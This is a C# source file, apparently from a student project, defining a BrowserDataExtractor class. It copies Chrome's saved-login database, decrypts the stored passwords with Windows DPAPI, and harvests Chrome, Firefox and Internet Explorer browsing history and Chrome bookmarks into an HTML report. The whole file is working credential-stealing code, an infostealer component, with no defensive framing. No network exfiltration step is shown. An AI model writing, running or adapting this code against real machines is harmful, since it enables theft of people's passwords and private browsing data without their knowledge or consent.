using System;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Collections.Generic;
using System.Linq;
using Microsoft.Win32;
using System.Security.Cryptography;
using System.Data.SQLite;

namespace TP
{
    public class BrowserDataExtractor : DataExtractor
    {

        public BrowserDataExtractor(string outputFileName)
        {
            fileName = outputFileName;
        }

        protected override string ExtractData()
        {
            List<string> headers;
            string extractedData;

            List<List<string>> chromeUserPassword = GetChromeUserPassword();
            headers = new List<string> { "URL", "User", "Password" };
            extractedData = ToHTMLFormat("Chrome users and passwords", headers, chromeUserPassword);

            List<List<string>> chromeHistory = GetChromeHistory();
            headers = new List<string> { "URLs" };
            extractedData += ToHTMLFormat("Chrome history", headers, chromeHistory);

            List<List<string>> firefoxHistory = GetFirefoxHistory();
            headers = new List<string> { "URLs" };
            extractedData += ToHTMLFormat("Firefox history", headers, firefoxHistory);

            List<List<string>> ieHistory = GetIEHistory();
            headers = new List<string> { "URLs" };
            extractedData += ToHTMLFormat("Internet Explorer history", headers, ieHistory);

            string chromeBookmarks = GetChromeBookmarks();
            extractedData += ToHTMLFormat("Chrome bookmarks", new List<string>() , new List<List<string>>());
            extractedData += chromeBookmarks;

            return extractedData;
        }

        protected List<List<string>> GetIEHistory()
        {
            var localKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32);
            List<List<string>> history = new List<List<string>>();
            var subKey = localKey.OpenSubKey(@"Software\Microsoft\Internet Explorer\TypedURLs");
            string[] registryKeyValue = subKey?.GetValueNames();

            foreach (string key in registryKeyValue)
            {
                var val = subKey?.GetValue(key);
                List<string> row = new List<string>();
                row.Add(val.ToString());
                history.Add(row);
            }           
            return history;
        }

        protected List<List<string>> GetChromeHistory()
        {
            var filePath = @"%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\History";
            string pattern = @"(htt(p|s)://([\w-]+\.)+[\w-]+[\w- ./?%&=]*)*";
            string binaryText = ReadFilePath(filePath, Encoding.Default);

            if (binaryText == null)
                return new List<List<string>>();

            Regex historyRegex = new Regex(pattern);
            var historyMatches = historyRegex.Matches(binaryText).OfType<Match>().Select(m => m.Groups[0].Value).Distinct();
            List<List<string>> history = new List<List<string>>();

            foreach (var his in historyMatches)
            {
                List<string> row = new List<string>();
                row.Add(his);
                history.Add(row);
            }

            return history;
        }

        protected string GetChromeBookmarks()
        {
            var filePath = @"%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Bookmarks";
            string jsonText = ReadFilePath(filePath, Encoding.Default);
            return jsonText;
        }

        protected List<List<string>> GetChromeUserPassword()
        {
            var pathWithEnv = @"%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data";
            var filePath = Environment.ExpandEnvironmentVariables(pathWithEnv);
            if (filePath == null)
                return new List<List<string>>();

            string tempFileName = Path.GetTempPath() + Path.GetRandomFileName();
            File.Copy(filePath, tempFileName);

            string ds = @"Data Source=" + tempFileName;
            SQLiteConnection conn = new SQLiteConnection(ds);
            conn.Open();
            string q = "SELECT action_url, username_value, password_value FROM logins";
            SQLiteCommand cmd = new SQLiteCommand(q, conn);
            SQLiteDataReader dr = cmd.ExecuteReader();
            List<List<string>> pwds = new List<List<string>>();

            while (dr.Read())
            {
                var decrypt = ProtectedData.Unprotect((byte[])dr["password_value"], null, DataProtectionScope.CurrentUser);
                var pwd = Encoding.ASCII.GetString(decrypt);
                List<string> userPwdRow = new List<string> { (string) dr["action_url"], (string) dr["username_value"], pwd };
                pwds.Add(userPwdRow);
            }

            return pwds;
        }

        protected List<List<string>> GetFirefoxHistory()
        {
            var pathWithEnv = @"%USERPROFILE%\AppData\Roaming\Mozilla\Firefox\Profiles\";
            var filePath = Environment.ExpandEnvironmentVariables(pathWithEnv);

            if (!Directory.Exists(filePath))
                return new List<List<string>>();

            string fxHistory = Directory.GetDirectories(filePath, "*.*").Where(s => s.EndsWith(".default")).ToList().Last();
            string pattern = @"(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?";
            Regex firefoxHistory = new Regex(pattern);
            string historyFile = ReadFilePath(fxHistory + "\\places.sqlite", Encoding.Default);
            
            Regex histRegex = new Regex(pattern);
            var histMatches = histRegex.Matches(historyFile).OfType<Match>().Select(m => m.Groups[0].Value).Distinct();
            List<List<string>> history = new List<List<string>>();
            foreach (var his in histMatches)
            {
                List<string> row = new List<string>();
                row.Add(his);
                history.Add(row);
            }

            return history;
        }

        protected string ReadFilePath(string pathWithEnv, Encoding encoding)
        {
            var filePath = Environment.ExpandEnvironmentVariables(pathWithEnv);
            if (filePath == null)
                return null;

            // Copia el archivo, ya que si está en uso puede fallar la solicitud de lectura
            string tempFileName = Path.GetTempPath() + Path.GetRandomFileName();
            File.Copy(filePath, tempFileName);
            FileStream fs = File.OpenRead(tempFileName);
            StreamReader streamReader = new StreamReader(fs, encoding);
            string binaryText = streamReader.ReadToEnd();
            streamReader.Close();
            fs.Close();

            // Luego de leerlo, se elimina la copia
            File.Delete(tempFileName);

            return binaryText;
        }
    }
}
